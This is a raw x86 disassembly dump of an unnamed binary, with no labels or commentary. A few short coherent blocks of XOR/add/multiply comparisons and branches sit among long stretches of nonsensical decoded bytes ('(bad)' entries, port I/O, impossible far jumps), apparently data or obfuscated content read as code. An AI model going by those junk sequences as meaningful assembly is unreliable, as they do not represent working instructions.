  403a83:	mov    edi,DWORD PTR [ebp-0x8]
  403a86:	and    DWORD PTR ds:0x43389b,ebx
  403a8c:	mov    ebx,DWORD PTR [ebp-0x10]
  403a8f:	sub    ebx,edi
  403a91:	cmp    ebx,edx
  403a93:	ja     0x403aa5
  403a99:	mov    edx,DWORD PTR [ebp-0x4]
  403a9c:	xor    edx,eax
  403a9e:	add    edx,ecx
  403aa0:	jmp    0x40478a
  403aa5:	mov    edx,DWORD PTR [ebp-0x2c]
  403aa8:	mov    edi,DWORD PTR [ebp-0x4]
  403aab:	xor    edx,eax
  403aad:	xor    edi,eax
  403aaf:	add    edi,ecx
  403ab1:	add    edx,ecx
  403ab3:	imul   edx,edi
  403ab6:	mov    edi,DWORD PTR [ebp-0x8]
  403ab9:	jmp    0x403dbc
  403abe:	pop    ebp
  403abf:	cli    
  403ac0:	mov    bh,0xac
  403ac2:	jno    0x403a75
  403ac4:	gs dec ebx
  403ac6:	or     BYTE PTR [edi],dl
  403ac8:	scas   al,BYTE PTR es:[edi]
  403ac9:	loopne 0x403b3f
  403acb:	in     al,dx
  403acc:	cwde   
  403acd:	pop    ss
  403ace:	and    BYTE PTR [eax],dl
  403ad0:	jle    0x403b50
  403ad2:	pop    eax
  403ad3:	jl     0x403b53
  403ad5:	jle    0x403a9d
  403ad7:	bnd call 0xbcc2b10f
  403add:	mov    esi,0xd9095df2
  403ae2:	push   ds
  403ae3:	sbb    BYTE PTR [ebp+0x44ee84a9],al
  403ae9:	fwait
  403aea:	sbb    eax,esi
  403aec:	inc    ebx
  403aed:	ins    BYTE PTR es:[edi],dx
  403aee:	add    eax,0x3a900db4
  403af3:	push   0xea9b0c5d
  403af8:	cmp    BYTE PTR [esi-0xd],0x78
  403afc:	jae    0x403ab8
  403afe:	scas   eax,DWORD PTR es:[edi]
  403aff:	daa    
  403b00:	fmul   DWORD PTR [ebp-0x2461b31c]
  403b06:	in     al,0x4
  403b08:	cmp    al,cl
  403b0a:	push   esp
  403b0b:	sbb    al,0x9a
  403b0d:	fucomip st,st(6)
  403b0f:	rol    BYTE PTR [ebp-0x3f],1
  403b12:	inc    edx
  403b13:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403b14:	imul   eax,esp,0x18
  403b17:	cmc    
  403b18:	jg     0x403ae6
  403b1a:	daa    
  403b1b:	mov    gs,WORD PTR [esi+0x1dd72777]
  403b21:	cdq    
  403b22:	sahf   
  403b23:	pop    eax
  403b24:	loope  0x403b35
  403b26:	adc    DWORD PTR [edi+0x7d],eax
  403b29:	cmp    al,0x85
  403b2b:	cmp    ch,BYTE PTR [ecx+0x3d]
  403b2e:	dec    esi
  403b2f:	mov    al,ds:0x1914c631
  403b34:	fstp   DWORD PTR [ecx]
  403b36:	gs cmp al,0x5e
  403b39:	mov    DWORD PTR [eax],0xaf2355d7
  403b3f:	xor    al,0x9f
  403b41:	mov    ch,0xcd
  403b43:	xchg   edx,eax
  403b44:	(bad)  
  403b45:	cld    
  403b46:	push   ecx
  403b47:	cmp    dh,BYTE PTR [edx+0x33]
  403b4a:	and    dl,BYTE PTR [edx]
  403b4c:	(bad)  
  403b4d:	idiv   BYTE PTR [ebp-0x10]
  403b50:	dec    ebx
  403b51:	pushf  
  403b52:	mov    al,ds:0x63231280
  403b57:	pop    edx
  403b58:	in     eax,dx
  403b59:	or     ah,BYTE PTR [edx]
  403b5b:	cli    
  403b5c:	pop    es
  403b5d:	outs   dx,DWORD PTR ds:[esi]
  403b5e:	jle    0x403b26
  403b60:	dec    ecx
  403b61:	in     eax,0x33
  403b63:	jmp    0x8359:0x76babadf
  403b6a:	(bad)  
  403b6b:	ja     0x403b68
  403b6d:	out    dx,al
  403b6e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403b6f:	mov    WORD PTR ds:0xfc199dcd,?
  403b75:	out    0x59,al
  403b77:	xor    ebp,DWORD PTR [edx]
  403b79:	in     al,dx
  403b7a:	push   edx
  403b7b:	ins    BYTE PTR es:[edi],dx
  403b7c:	xor    ah,bl
  403b7e:	mov    dh,0x98
  403b80:	(bad)  
  403b81:	int    0xe5
  403b83:	jmp    0x21246b98
  403b88:	retf   0xc6e
  403b8b:	in     eax,dx
  403b8c:	xchg   ecx,eax
  403b8d:	xchg   ebx,eax
  403b8e:	jbe    0x403b8d
  403b90:	adc    eax,edi
  403b92:	sub    dh,dl
  403b94:	fcomp  QWORD PTR [ebx+esi*1]
  403b97:	cs mov ebx,0xbcffa99d
  403b9d:	pop    eax
  403b9e:	push   ecx
  403b9f:	scas   al,BYTE PTR es:[edi]
  403ba0:	sar    bl,1
  403ba2:	mov    ebx,0xee80b36f
  403ba7:	rcr    BYTE PTR [edx],0xe1
  403baa:	imul   esp,DWORD PTR [edi-0x37],0xc25d9072
  403bb1:	int    0x93
  403bb3:	mov    ds:0x6867860f,eax
  403bb8:	dec    esi
  403bb9:	mov    bl,0x1e
  403bbb:	pop    edi
  403bbc:	cmp    DWORD PTR [edi],ebx
  403bbe:	sbb    al,0x68
  403bc0:	stos   DWORD PTR es:[edi],eax
  403bc1:	and    eax,0x5af6b8ab
  403bc6:	das    
  403bc7:	inc    ax
  403bc9:	adc    DWORD PTR [esi-0x4d],0xffffffb2
  403bcd:	push   ebx
  403bce:	inc    eax
  403bcf:	mov    edi,0xbdad5a9c
  403bd4:	jecxz  0x403be5
  403bd6:	pop    ds
  403bd7:	or     BYTE PTR [eax],bh
  403bd9:	add    al,ah
  403bdb:	xchg   esi,eax
  403bdc:	nop
  403bdd:	out    0xd7,eax
  403bdf:	(bad)  
  403be0:	scas   al,BYTE PTR es:[edi]
  403be1:	mov    bl,0xd5
  403be3:	idiv   DWORD PTR [eax+0x470f1010]
  403be9:	pop    ecx
  403bea:	call   0x8fac:0x56a17e88
  403bf1:	shl    BYTE PTR [edi-0x5c609f02],cl
  403bf7:	and    ch,dl
  403bf9:	(bad)  
  403bfa:	enter  0xf01b,0xe1
  403bfe:	jne    0x403c78
  403c00:	push   cs
  403c01:	or     ebx,0x4396c49
  403c07:	fiadd  DWORD PTR [esi-0x29]
  403c0a:	sub    eax,ebp
  403c0c:	data16 sbb al,0x89
  403c0f:	sub    al,BYTE PTR [edx+eiz*1+0x436189cf]
  403c16:	inc    esp
  403c17:	pop    es
  403c18:	cwde   
  403c19:	dec    esp
  403c1a:	mov    ah,0x4d
  403c1c:	test   BYTE PTR [ecx+0x4],bl
  403c1f:	push   0xffffff90
  403c21:	test   BYTE PTR [edx-0x19],ch
  403c24:	in     eax,0x82
  403c26:	outs   dx,DWORD PTR ds:[esi]
  403c27:	push   ebx
  403c28:	ds in  eax,0x8f
  403c2b:	dec    edi
  403c2c:	mov    ah,0xa
  403c2e:	inc    edi
  403c2f:	mov    ch,0x4f
  403c31:	inc    ebp
  403c32:	fld    QWORD PTR [ecx+0x63]
  403c35:	(bad)  
  403c36:	jecxz  0x403c19
  403c38:	rol    BYTE PTR [edx-0x3521cf9a],1
  403c3e:	cdq    
  403c3f:	fcom   st(3)
  403c41:	popa   
  403c42:	gs aas 
  403c44:	adc    al,0x71
  403c46:	out    0x64,al
  403c48:	neg    al
  403c4a:	clc    
  403c4b:	adc    al,0xa3
  403c4d:	dec    esp
  403c4e:	data16 and al,0x5c
  403c51:	cwde   
  403c52:	ins    DWORD PTR es:[edi],dx
  403c53:	in     eax,dx
  403c54:	inc    edx
  403c55:	mov    esi,0xebaeab0
  403c5a:	in     al,0x9d
  403c5c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403c5d:	xchg   edi,eax
  403c5e:	pop    ecx
  403c5f:	mov    al,BYTE PTR [esi-0x49b6eccb]
  403c65:	add    DWORD PTR [ebp+0x43871cf],0x63
  403c6c:	inc    esi
  403c6d:	mov    eax,ds:0x2cb40088
  403c72:	mov    ecx,0x7939324f
  403c77:	shl    BYTE PTR [edi+edi*4],cl
  403c7a:	adc    eax,0xc7e8695a
  403c7f:	inc    edi
  403c80:	jg     0x403c3d
  403c82:	aad    0x4
  403c84:	pop    edx
  403c85:	push   ebx
  403c86:	js     0x403c78
  403c88:	cli    
  403c89:	(bad)  
  403c8a:	pop    eax
  403c8b:	outs   dx,DWORD PTR ds:[esi]
  403c8c:	fcomp  QWORD PTR es:[edi+0x5c]
  403c90:	pop    ecx
  403c91:	out    dx,eax
  403c92:	ret    
  403c93:	pop    ecx
  403c94:	mov    ch,0x18
  403c96:	xchg   DWORD PTR [esp+edi*1+0x46],edx
  403c9a:	jb     0x403c41
  403c9c:	popaw  
  403c9e:	adc    edx,ebx
  403ca0:	bnd jnp 0x403c82
  403ca3:	mov    ebx,0xcf4f5251
  403ca8:	pop    ebp
  403ca9:	inc    eax
  403caa:	jne    0x403c52
  403cac:	daa    
  403cad:	test   DWORD PTR [eax-0x748a1ea7],eax
  403cb3:	xchg   edx,eax
  403cb4:	xor    eax,0x24b351b
  403cba:	mov    edi,ss
  403cbc:	neg    BYTE PTR [eax+0x652b9ace]
  403cc2:	loop   0x403c48
  403cc4:	sbb    BYTE PTR [esi+0xe],dl
  403cc7:	lock pop ecx
  403cc9:	push   esp
  403cca:	jae    0x403c59
  403ccc:	jmp    0xaa7:0x94827553
  403cd3:	mov    BYTE PTR [edi-0x1ec6dc90],bh
  403cd9:	mov    WORD PTR [edx+0x6a],?
  403cdc:	pop    ds
  403cdd:	enter  0xddd5,0xe9
  403ce1:	je     0x403c81
  403ce3:	or     DWORD PTR [edi+0x26],0xa
  403ce7:	push   ebx
  403ce8:	jge    0x403c86
  403cea:	pusha  
  403ceb:	ja     0x403c7e
  403ced:	(bad)  
  403cee:	shr    ebx,0x29
  403cf1:	cmc    
  403cf2:	mov    cl,BYTE PTR [esi]
  403cf4:	or     BYTE PTR ds:0x47d18237,bl
  403cfa:	mov    ds:0x27e57a0a,eax
  403cff:	sbb    ch,bh
  403d01:	inc    ebp
  403d02:	mov    ebp,es
  403d04:	pop    ss
  403d05:	repnz outs dx,DWORD PTR ds:[esi]
  403d07:	sti    
  403d08:	pop    esp
  403d09:	xlat   BYTE PTR ds:[ebx]
  403d0a:	and    edi,esi
  403d0c:	mov    BYTE PTR [ebp-0x4148d8b3],cl
  403d12:	mov    bh,0x51
  403d14:	dec    eax
  403d15:	add    esi,DWORD PTR ds:0xccb4dccc
  403d1b:	xor    eax,DWORD PTR [ecx]
  403d1d:	jp     0x403d7d
  403d1f:	jns    0x403ce6
  403d21:	shr    BYTE PTR [esi+ebx*1+0x78bce761],0x7b
  403d29:	mov    eax,0x707d17e4
  403d2e:	(bad)  
  403d2f:	xchg   esi,eax
  403d30:	into   
  403d31:	into   
  403d32:	gs mov ah,0x89
  403d35:	mov    ebx,0xe503b95a
  403d3a:	jne    0x403ceb
  403d3c:	xor    eax,0x36107bd0
  403d41:	lods   al,BYTE PTR ds:[esi]
  403d42:	iret   
  403d43:	push   0x6bd242cf
  403d48:	inc    ecx
  403d49:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403d4a:	or     eax,DWORD PTR [edx+ebp*4]
  403d4d:	rol    DWORD PTR [edi+0x74],1
  403d50:	stc    
  403d51:	fcomp  DWORD PTR [eax-0xbdf30eb]
  403d57:	push   esp
  403d58:	pop    es
  403d59:	lock (bad) 
  403d5c:	dec    eax
  403d5d:	adc    BYTE PTR [eax],0x78
  403d60:	xor    ecx,edi
  403d62:	push   cs
  403d63:	add    BYTE PTR [eax+0x25e66a6],ah
  403d69:	ror    DWORD PTR [ecx-0x6e],cl
  403d6c:	inc    edi
  403d6d:	adc    al,0x93
  403d6f:	icebp  
  403d70:	jle    0x403dd1
  403d72:	(bad)  
  403d73:	loop   0x403d1a
  403d75:	xchg   esp,eax
  403d76:	in     al,0x8d
  403d78:	shl    al,1
  403d7a:	jne    0x403cff
  403d7c:	mov    dl,0x2c
  403d7e:	cmp    BYTE PTR [ecx+0x7a46b9b1],cl
  403d84:	icebp  
  403d85:	js     0x403d63
  403d87:	(bad)  
  403d88:	inc    edi
  403d89:	imul   ebp,DWORD PTR [edx],0x69
  403d8c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403d8d:	call   0xb9bd4385
  403d92:	(bad)  
  403d94:	ins    BYTE PTR es:[edi],dx
  403d95:	mov    ecx,0xa9f54ab3
  403d9a:	sbb    DWORD PTR [eax-0x54043ef2],edi
  403da0:	xor    eax,0x382eeab1
  403da5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403da6:	aad    0xd7
  403da8:	mov    edx,DWORD PTR [eax]
  403daa:	push   esp
  403dab:	jmp    0x403d5f
  403dad:	repnz xchg ebx,eax
  403daf:	jl     0x403d52
  403db1:	fild   DWORD PTR [edi+0x25]
  403db4:	sub    ebp,DWORD PTR [ebx+0x5e777cc2]
  403dba:	int    0x47
  403dbc:	mov    ebx,DWORD PTR [ebp-0x10]
  403dbf:	sub    ebx,edi
  403dc1:	cmp    ebx,edx
  403dc3:	ja     0x403dd1
  403dc9:	mov    edx,DWORD PTR [ebp-0x28]
  403dcc:	jmp    0x404176
  403dd1:	mov    edx,DWORD PTR [ebp-0x30]
  403dd4:	mov    edi,DWORD PTR [ebp-0x4]
  403dd7:	xor    edx,eax
  403dd9:	xor    edi,eax
  403ddb:	add    edi,ecx
  403ddd:	add    edx,ecx
  403ddf:	imul   edx,edi
  403de2:	mov    edi,DWORD PTR [ebp-0x8]
  403de5:	mov    ebx,DWORD PTR [ebp-0x10]
  403de8:	sub    ebx,edi
  403dea:	cmp    ebx,edx
  403dec:	ja     0x403dfa
  403df2:	mov    edx,DWORD PTR [ebp-0x2c]
  403df5:	jmp    0x404176
  403dfa:	mov    edx,DWORD PTR [ebp-0x34]
  403dfd:	mov    edi,DWORD PTR [ebp-0x4]
  403e00:	xor    edx,eax
  403e02:	xor    edi,eax
  403e04:	add    edi,ecx
  403e06:	add    edx,ecx
  403e08:	imul   edx,edi
  403e0b:	mov    edi,DWORD PTR [ebp-0x8]
  403e0e:	mov    ebx,DWORD PTR [ebp-0x10]
  403e11:	sub    ebx,edi
  403e13:	cmp    ebx,edx
  403e15:	ja     0x403e23
  403e1b:	mov    edx,DWORD PTR [ebp-0x30]
  403e1e:	jmp    0x404176
  403e23:	mov    edx,DWORD PTR [ebp-0x38]
  403e26:	mov    edi,DWORD PTR [ebp-0x4]
  403e29:	xor    edx,eax
  403e2b:	xor    edi,eax
  403e2d:	add    edi,ecx
  403e2f:	add    edx,ecx
  403e31:	imul   edx,edi
  403e34:	mov    edi,DWORD PTR [ebp-0x8]
  403e37:	mov    ebx,DWORD PTR [ebp-0x10]
  403e3a:	sub    ebx,edi
  403e3c:	cmp    ebx,edx
  403e3e:	ja     0x403e4c
  403e44:	mov    edx,DWORD PTR [ebp-0x34]
  403e47:	jmp    0x404176
  403e4c:	mov    edx,DWORD PTR [ebp-0x3c]
  403e4f:	mov    edi,DWORD PTR [ebp-0x4]
  403e52:	xor    edx,eax
  403e54:	xor    edi,eax
  403e56:	add    edx,ecx
  403e58:	add    edi,ecx
  403e5a:	imul   edx,edi
  403e5d:	mov    edi,DWORD PTR [ebp-0x8]
  403e60:	mov    ebx,DWORD PTR [ebp-0x10]
  403e63:	jmp    0x404166
  403e68:	mov    dh,0x45
  403e6a:	xchg   edi,eax
  403e6b:	xor    BYTE PTR [ebp+0x50],0xb1
  403e6f:	jno    0x403e18
  403e71:	(bad)  
  403e72:	cs push 0xffffff9f
  403e75:	fistp  DWORD PTR [ecx-0x17]
  403e78:	or     bl,BYTE PTR [edi]
  403e7a:	jle    0x403efa
  403e7c:	pop    eax
  403e7d:	jl     0x403efd
  403e7f:	jle    0x403e1f
  403e81:	adc    DWORD PTR [ebx],eax
  403e83:	lea    dx,[ecx+0x23]
  403e87:	adc    eax,0xe82b6e98
  403e8c:	jmp    0xddf3:0xbcdb7018
  403e93:	repz enter 0xd02,0x1f
  403e98:	ja     0x403e94
  403e9a:	sub    BYTE PTR [eax+0x61db1b42],ch
  403ea0:	mov    dl,0x4e
  403ea2:	call   0xae4690cf
  403ea7:	cmp    DWORD PTR [ebp+edx*4+0x13],esp
  403eab:	int3   
  403eac:	mov    bl,0x85
  403eae:	add    DWORD PTR [ebx-0x58],esp
  403eb1:	je     0x403eca
  403eb3:	mov    esp,0x81d53d3c
  403eb8:	in     al,dx
  403eb9:	push   ecx
  403eba:	repz pop ss
  403ebc:	push   esi
  403ebd:	rcr    BYTE PTR [eax+0x31cae39f],cl
  403ec3:	push   ebx
  403ec4:	adc    DWORD PTR [edx+0x18],ebx
  403ec7:	adc    eax,0x7f3045d1
  403ecc:	sub    al,0x3f
  403ece:	push   0xffffffd8
  403ed0:	sub    ebp,DWORD PTR [esi]
  403ed2:	aad    0xe7
  403ed4:	inc    esi
  403ed5:	mov    bh,0xc0
  403ed7:	xchg   ebx,esi
  403ed9:	mov    esi,0x985bda
  403ede:	aas    
  403edf:	cwde   
  403ee0:	xchg   ecx,eax
  403ee1:	mov    ds:0xfa067d21,eax
  403ee6:	xchg   esi,eax
  403ee7:	inc    BYTE PTR [ebx]
  403ee9:	dec    ecx
  403eea:	fcomp  DWORD PTR [ebx-0x20]
  403eed:	xchg   esp,eax
  403eee:	test   eax,0xd184e271
  403ef3:	repz and ah,BYTE PTR [ecx]
  403ef6:	or     dh,BYTE PTR [esi+ecx*1+0x2d]
  403efa:	pop    edx
  403efb:	mov    ebx,ebx
  403efd:	adc    eax,0xa56c35be
  403f02:	sbb    eax,0xc2a4bce3
  403f07:	adc    BYTE PTR [ebp+0x4a],bh
  403f0a:	pop    ebp
  403f0b:	fwait
  403f0c:	mov    BYTE PTR ds:[esp+ecx*4],0xc
  403f11:	mov    BYTE PTR [eax],dl
  403f13:	lods   eax,DWORD PTR ds:[esi]
  403f14:	test   eax,0xbbaaa730
  403f19:	daa    
  403f1a:	jno    0x403f2e
  403f1c:	dec    eax
  403f1d:	sub    DWORD PTR [eax+0x35],0xffffffe8
  403f21:	pop    ebp
  403f22:	cmp    DWORD PTR ds:0xb78c73e7,edx
  403f28:	inc    ecx
  403f29:	mov    ds:0x4f3d4eeb,eax
  403f2e:	repnz aas 
  403f30:	xchg   edx,eax
  403f31:	call   0x2fd:0x736ef0a8
  403f38:	push   edi
  403f39:	dec    edx
  403f3a:	ror    BYTE PTR ds:0x65d4e60e,0xf5
  403f41:	and    al,0x9c
  403f43:	retf   
  403f44:	xor    dl,bh
  403f46:	mov    WORD PTR [edi],?
  403f48:	dec    eax
  403f49:	fstp   QWORD PTR [ebx]
  403f4b:	shr    dh,0x31
  403f4e:	add    bl,BYTE PTR [ecx]
  403f50:	mov    dh,0xd
  403f52:	sti    
  403f53:	or     eax,0x41b72b2a
  403f58:	or     al,0xb9
  403f5a:	sub    esp,DWORD PTR [ebx+0x3a7502cb]
  403f60:	mov    WORD PTR [edx-0x32457122],es
  403f66:	jle    0x403f83
  403f68:	mov    edx,DWORD PTR [edi+0x73]
  403f6b:	and    DWORD PTR [esi-0x520795d5],ebp
  403f71:	jnp    0x403f31
  403f73:	mov    bl,0x95
  403f75:	and    edi,DWORD PTR fs:[si+0x5404]
  403f7b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403f7c:	(bad)  
  403f7d:	mov    eax,0xc24e297a
  403f82:	mov    bl,BYTE PTR [edx+ebx*1+0x37130403]
  403f89:	sub    eax,0xf51f9284
  403f8e:	adc    ecx,ebp
  403f90:	jmp    0xf522454
  403f95:	mov    bh,0xaa
  403f97:	adc    eax,0x7cafce5a
  403f9c:	cmp    al,0xe1
  403f9e:	push   ecx
  403f9f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403fa0:	js     0x403f3b
  403fa2:	pop    ebx
  403fa3:	cli    
  403fa4:	cwde   
  403fa5:	retf   
  403fa6:	and    BYTE PTR [eax-0x7c81e60f],bl
  403fac:	int3   
  403fad:	inc    esp
  403fae:	and    eax,0xb2d714aa
  403fb3:	shr    DWORD PTR [eax-0x13e132d5],cl
  403fb9:	pop    esi
  403fba:	popa   
  403fbb:	pop    ds
  403fbc:	loope  0x403faa
  403fbe:	and    bh,dl
  403fc0:	xchg   esi,eax
  403fc1:	mov    dl,0x58
  403fc3:	ins    BYTE PTR es:[edi],dx
  403fc4:	sbb    BYTE PTR [ecx],bh
  403fc6:	sub    ebp,edi
  403fc8:	jae    0x404012
  403fca:	add    dh,ah
  403fcc:	stos   DWORD PTR es:[edi],eax
  403fcd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403fce:	xchg   ecx,eax
  403fcf:	mov    edx,0xb3dea44
  403fd4:	jo     0x403f56
  403fd6:	(bad)  
  403fd7:	std    
  403fd8:	(bad)  
  403fd9:	sub    al,0xac
  403fdb:	mov    ds:0x7de23a10,eax
  403fe0:	pop    esp
  403fe1:	push   cs
  403fe2:	std    
  403fe3:	iret   
  403fe4:	ror    DWORD PTR [ebp-0x6fee61b0],0xfa
  403feb:	cmp    DWORD PTR [esi-0x26],ecx
  403fee:	mov    eax,0xc47c6e32
  403ff3:	(bad)  
  403ff4:	aaa    
  403ff5:	es xchg ecx,eax
  403ff7:	mov    bh,0xc2
  403ff9:	xor    al,0x7f
  403ffb:	mov    eax,0x701a02b3
  404000:	or     esp,edi
  404002:	enter  0xca21,0x6c
  404006:	mov    eax,ds:0xfb3f2572
  40400b:	(bad)  
  40400c:	idiv   DWORD PTR [esi]
  40400e:	cmc    
  40400f:	icebp  
  404010:	js     0x403ff3
  404012:	pop    ecx
  404013:	xchg   esp,eax
  404014:	sub    esp,ebx
  404016:	and    eax,0xa1db688c
  40401b:	ds xor esi,edi
  40401e:	mov    ?,WORD PTR [eax+0x63384e74]
  404024:	push   ebx
  404025:	arpl   WORD PTR [ebp-0x2c7dd467],ax
  40402b:	fidivr DWORD PTR [esi]
  40402d:	add    edi,ebx
  40402f:	mov    dl,0xb1
  404031:	test   eax,0x8ba17069
  404036:	imul   eax,DWORD PTR [ebp+0x6b],0x76e77306
  40403d:	gs loop 0x404003
  404040:	push   ds
  404041:	fld    QWORD PTR [ebx+0x3f]
  404044:	mov    al,0x4
  404046:	div    DWORD PTR [edx+0x4ae24337]
  40404c:	pop    esp
  40404d:	jno    0x404046
  40404f:	mov    dh,0xb7
  404051:	add    al,0xbb
  404053:	and    DWORD PTR [eax+0x23f3b18a],ebp
  404059:	pop    esp
  40405a:	call   0x8f36:0xd7206137
  404061:	stc    
  404062:	mov    WORD PTR [eax+0x64],ss
  404065:	fisubr DWORD PTR gs:[edi+0x735acfb8]
  40406c:	enter  0xe1bd,0x34
  404070:	jmp    0x572fac96
  404075:	daa    
  404076:	xor    DWORD PTR [esi],ebp
  404078:	mov    al,0x35
  40407a:	dec    esp
  40407b:	ret    0xae94
  40407e:	sbb    ch,BYTE PTR [edi]
  404080:	test   eax,0x97e2bc70
  404085:	imul   edx,DWORD PTR [ebx],0xb5813260
  40408b:	leave  
  40408c:	inc    edx
  40408d:	xchg   ebp,eax
  40408e:	call   0x39879e3e
  404093:	dec    edi
  404094:	test   al,0x5e
  404096:	test   edi,edi
  404098:	jg     0x40405d
  40409a:	and    eax,DWORD PTR [esi]
  40409c:	add    bl,BYTE PTR [esi]
  40409e:	(bad)  
  40409f:	mov    al,ds:0x394df17b
  4040a4:	inc    esi
  4040a5:	xchg   BYTE PTR cs:[edx-0x6d3f4eac],dl
  4040ac:	ret    0xa3a3
  4040af:	pop    esi
  4040b0:	sub    ebp,edi
  4040b2:	add    BYTE PTR [ebx-0x7d],0x4e
  4040b6:	test   eax,0x52049c8
  4040bb:	int    0x64
  4040bd:	adc    BYTE PTR [ebp+0x3a],bl
  4040c0:	pop    ds
  4040c1:	inc    ebp
  4040c2:	sub    DWORD PTR [ebx+0x11456153],edx
  4040c8:	jne    0x404082
  4040ca:	jns    0x4040e2
  4040cc:	shl    BYTE PTR [ebx],0x49
  4040cf:	push   ss
  4040d0:	loope  0x404093
  4040d2:	inc    esi
  4040d3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4040d4:	inc    ecx
  4040d5:	dec    eax
  4040d6:	jl     0x40410f
  4040d8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4040d9:	adc    al,0xab
  4040db:	push   esi
  4040dc:	ror    bl,1
  4040de:	pop    ss
  4040df:	aas    
  4040e0:	mov    cl,0x1c
  4040e2:	cli    
  4040e3:	mov    WORD PTR [eax],?
  4040e5:	or     esi,DWORD PTR [edx+esi*4+0x37]
  4040e9:	push   0x8de0e557
  4040ee:	in     al,dx
  4040ef:	repz push ds
  4040f1:	ja     0x404112
  4040f3:	cmp    DWORD PTR [ebx],0xe0f2f510
  4040f9:	not    BYTE PTR [esi]
  4040fb:	mov    dh,0xcb
  4040fd:	sar    BYTE PTR [eax-0xf],1
  404100:	popa   
  404101:	das    
  404102:	scas   al,BYTE PTR es:[edi]
  404103:	(bad)  
  404104:	js     0x40415e
  404106:	loopne 0x40416d
  404108:	inc    eax
  404109:	pop    ebp
  40410a:	push   ds
  40410b:	ins    DWORD PTR es:[edi],dx
  40410c:	cmp    dl,bl
  40410e:	mov    dl,0x91
  404110:	imul   esi,DWORD PTR [ecx],0x8aa4bd71
  404116:	mov    bl,BYTE PTR [bp+si-0x21]
  40411a:	xor    cl,BYTE PTR [ebx-0x5f4ef0e5]
  404120:	cmp    al,0x2f
  404122:	inc    ebx
  404123:	inc    ebx
  404124:	xchg   edx,eax
  404125:	ds jnp 0x4040e9
  404128:	sbb    al,0xb5
  40412a:	test   DWORD PTR ds:0x1c955f7d,eax
  404130:	shl    BYTE PTR [ecx],0xc3
  404133:	imul   edi,DWORD PTR es:[edx+0x58f7d8f5],0x79b368fb
  40413e:	or     BYTE PTR [ecx-0x6],0xe9
  404142:	mov    edx,0x69b304ef
  404147:	pop    ds
  404148:	nop
  404149:	inc    edx
  40414a:	(bad)  
  40414c:	add    edi,DWORD PTR [esi+0x24]
  40414f:	pusha  
  404150:	icebp  
  404151:	xchg   edi,eax
  404152:	addr16 nop
  404154:	data16 ja 0x4040f5
  404157:	int    0xe8
  404159:	pop    ebp
  40415a:	int    0x7a
  40415c:	pop    esp
  40415d:	jmp    0xffeb:0xc8db4baa
  404164:	int    0x78
  404166:	sub    ebx,edi
  404168:	cmp    ebx,edx
  40416a:	mov    edx,DWORD PTR [ebp-0x38]
  40416d:	jbe    0x404176
  404173:	mov    edx,DWORD PTR [ebp-0x3c]
  404176:	mov    edi,DWORD PTR [ebp-0x4]
  404179:	jmp    0x40447c
  40417e:	mov    al,0x3b
  404180:	aaa    
  404181:	or     BYTE PTR [ebp-0x10],dh
  404184:	mov    cl,0x63
  404186:	sub    DWORD PTR [edi],0xffffffd4
  404189:	xor    BYTE PTR [edx],dl
  40418b:	mov    ch,BYTE PTR [ebx]
  40418d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40418e:	je     0x4041ad
  404190:	jle    0x404210
  404192:	pop    eax
  404193:	jl     0x404213
  404195:	jle    0x4041db
  404197:	ja     0x404184
  404199:	fwait
  40419a:	mov    eax,DWORD PTR ds:0x44df3b27
  4041a0:	test   eax,0xd9beed89
  4041a5:	ret    
  4041a6:	jp     0x40417a
  4041a8:	in     al,dx
  4041a9:	mul    DWORD PTR [esi-0x1]
  4041ac:	xchg   DWORD PTR [ecx-0x8605106],esi
  4041b2:	mov    bh,0xdf
  4041b4:	sbb    ah,ch
  4041b6:	aad    0xca
  4041b8:	mov    edx,0x74c9bf9f
  4041bd:	push   esp
  4041be:	lods   eax,DWORD PTR ds:[esi]
  4041bf:	pop    ebx
  4041c0:	(bad)  
  4041c1:	sti    
  4041c2:	xchg   esi,eax
  4041c3:	push   esi
  4041c4:	pusha  
  4041c5:	retf   
  4041c6:	push   ebx
  4041c7:	push   ebp
  4041c8:	lock jge 0x40420a
  4041cb:	arpl   WORD PTR [edx-0x7b77066f],ax
  4041d1:	pop    ds
  4041d2:	(bad)
  4041d6:	test   al,0x6
  4041d8:	ja     0x404244
  4041da:	inc    edx
  4041db:	(bad)  
  4041dc:	mov    dl,0xe3
  4041de:	add    ebx,DWORD PTR [edx-0x662e147]
  4041e4:	ins    BYTE PTR es:[edi],dx
  4041e5:	rol    DWORD PTR [ebx],cl
  4041e7:	dec    eax
  4041e8:	jle    0x4041ae
  4041ea:	call   0xba38:0x34971131
  4041f1:	and    eax,0x856069b7
  4041f6:	fsubp  st(5),st
  4041f8:	data16 lods al,BYTE PTR ds:[esi]
  4041fa:	inc    esp
  4041fb:	cs jg  0x4041cf
  4041fe:	aam    0x2d
  404200:	pop    edx
  404201:	rol    ebx,cl
  404203:	daa    
  404204:	cmc    
  404205:	in     al,0xe5
  404207:	pop    eax
  404208:	fwait
  404209:	(bad)  
  40420a:	cmp    esi,edx
  40420c:	add    DWORD PTR [ecx+0x4d],ecx
  40420f:	fidivr DWORD PTR [edx+eiz*8-0x1d70b957]
  404216:	ja     0x4041ca
  404218:	ja     0x4041cf
  40421a:	jae    0x40423b
  40421c:	int    0x60
  40421e:	mov    dh,0x7f
  404220:	(bad)  
  404221:	mov    edx,0xa8dd49fc
  404226:	outs   dx,BYTE PTR ds:[esi]
  404227:	dec    ebx
  404228:	mov    eax,0x8d12c788
  40422d:	nop
  40422e:	ror    BYTE PTR [edx+0x12],1
  404231:	jl     0x40425d
  404233:	leave  
  404234:	test   eax,0x9d8ee0c7
  404239:	mov    ch,0xb2
  40423b:	in     al,dx
  40423c:	jecxz  0x404284
  40423e:	in     eax,dx
  40423f:	repnz fdivr QWORD PTR [esi]
  404242:	int3   
  404243:	and    ebx,edi
  404245:	mov    eax,ds:0x16aca739
  40424a:	xor    BYTE PTR [ecx+edi*1],al
